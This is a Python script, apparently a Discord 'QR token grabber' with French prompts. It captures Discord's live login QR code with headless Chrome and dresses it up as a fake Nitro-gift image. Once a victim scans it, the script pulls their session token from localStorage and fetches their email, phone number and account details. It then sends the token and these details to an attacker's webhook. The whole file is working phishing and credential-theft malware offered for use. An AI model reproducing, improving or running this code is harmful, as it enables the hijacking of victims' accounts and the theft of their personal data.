from bs4 import BeautifulSoup as bs4
from selenium import webdriver
from PIL import Image
import base64
import time
import os
import requests
from colorama import Fore
import colorama
from discord_webhook import DiscordWebhook, DiscordEmbed
import datetime
from selenium.webdriver.chrome.service import Service
import lxml
import chromedriver_binary

colorama.init()

w = Fore.WHITE
r = Fore.RED
os.system('cls')
print(f"""{Fore.RESET}
 {w}██████{r}╗ {w}██████{r}╗      {w}██████{r}╗ {w}██████{r}╗  {w}█████{r}╗ {w}██████{r}╗ {w}███████{r}╗{w}██████{r}╗ 
{w}██{r}╔═══{w}██{r}╗{w}██{r}╔══{w}██{r}╗    {w}██{r}╔════╝ {w}██{r}╔══{w}██{r}╗{w}██{r}╔══{w}██{r}╗{w}██{r}╔══{w}██{r}╗{w}██{r}╔════╝{w}██{r}╔══{w}██{r}╗
{w}██{r}║   {w}██{r}║{w}██████{r}╔╝    {w}██{r}║  {w}███{r}╗{w}██████{r}╔╝{w}███████{r}║{w}██████{r}╔╝{w}█████{r}╗  {w}██████{r}╔╝
{w}██{r}║{w}▄▄ {w}██{r}║{w}██{r}╔══{w}██{r}╗    {w}██{r}║   {w}██{r}║{w}██{r}╔══{w}██{r}╗{w}██{r}╔══{w}██{r}║{w}██{r}╔══{w}██{r}╗{w}██{r}╔══╝  {w}██{r}╔══{w}██{r}╗
{r}╚{w}██████{r}╔╝{w}██{r}║  {w}██{r}║    {r}╚{w}██████{r}╔╝{w}██{r}║  {w}██{r}║{w}██{r}║  {w}██{r}║{w}██████{r}╔╝{w}███████{r}╗{w}██{r}║  {w}██{r}║
 {r}╚══{w}▀▀{r}═╝ ╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝{Fore.RESET}
 Made By LeRatGondin
""")
url = input("\nEntrez l'url du webhook : ")
print(f"{Fore.CYAN}Le qr code est en train d'être généré veuillez attendre{Fore.RESET}")
print('---')
try:
    os.remove("discord_gift.png")
    os.remove("temp/final_qr.png")
except:
    pass

options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches', ['enable-logging'])
options.add_experimental_option('detach', True)
options.add_argument('--headless')
options.add_argument('--disable-gpu')
options.add_argument("disable-infobars")
service=Service('chromedriver.exe')
driver = webdriver.Chrome(service=service, options=options)
driver.get('https://discord.com/login')
time.sleep(5)

page_source = driver.page_source
qr_code = bs4(page_source, features='lxml').find('div', {'class': 'qrCode-2R7t9S'}).find('img')['src']
file = os.path.join(os.getcwd(), 'temp\\qr_code.png')

img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))


with open(file,'wb') as handler:
    handler.write(img_data)

im1 = Image.open('temp/qr_code.png', 'r')
im2 = Image.open('temp/overlay.png', 'r')
im2_w, im2_h = im2.size
im1.paste(im2, (60, 55))

im1.save('temp/final_qr.png', quality=95)
im1 = Image.open('temp/template.png', 'r')
im2 = Image.open('temp/final_qr.png', 'r')
im1.paste(im2, (121, 389))
im1.show()
im1.save('discord_gift.png', quality=95)

print(f"{Fore.CYAN}Attente de scan{Fore.RESET}")
print(f"{Fore.CYAN}Fichier enregistré avec le nom [discord_gift.png]{Fore.RESET}")
print(f"{Fore.RED}Le qrcode ne dure que deux minutes{Fore.RESET}")

print('---')
while True:
    if "https://discord.com/login" != driver.current_url:
        print(f"{Fore.CYAN}Le code à été scanné{Fore.RESET}")
        print('---')
        time.sleep(5)
        token = driver.execute_script('''
window.dispatchEvent(new Event('beforeunload'));
let iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);
let localStorage = iframe.contentWindow.localStorage;
var token = JSON.parse(localStorage.token);
return token;
   
                    ''')
        print(f"\n{Fore.WHITE} - TOKEN: {Fore.YELLOW}[Le token est : {token}]")
        print('---')
        w = DiscordWebhook(url=url)
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }      
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
        em = DiscordEmbed(color='03b2f8' ,Title="Token Grab Qr",description=f"""\nToken Grab Qr\n@everyone\nNew Token : {token}\nName: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})""")
        fields = [
            {'name': 'Phone : ', 'value': res['phone']},
            {'name': 'Flags : ', 'value': res['flags']},
            {'name': 'Local language : ', 'value': res['locale']},
            {'name': 'MFA : ', 'value': res['mfa_enabled']},
            {'name': 'Verified : ', 'value': res['verified']},
        ]
        for field in fields:
            if field['value']:
                em.add_embed_field(name=field['name'], value=field['value'], inline=False)
        em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")

                             
                             
        w.add_embed(em)

        w.execute()

        time.sleep(10)
        os.remove("temp/final_qr.png")
        os.remove("temp/qr_code.png")
        os.system('cls')
        driver.quit()
        print(f"{Fore.RED}Merci d'avoir utilisé ce script , hesitez pas a aller voir mon github https://github.com/LeRatGondin/{Fore.RESET}")
        input()
        break
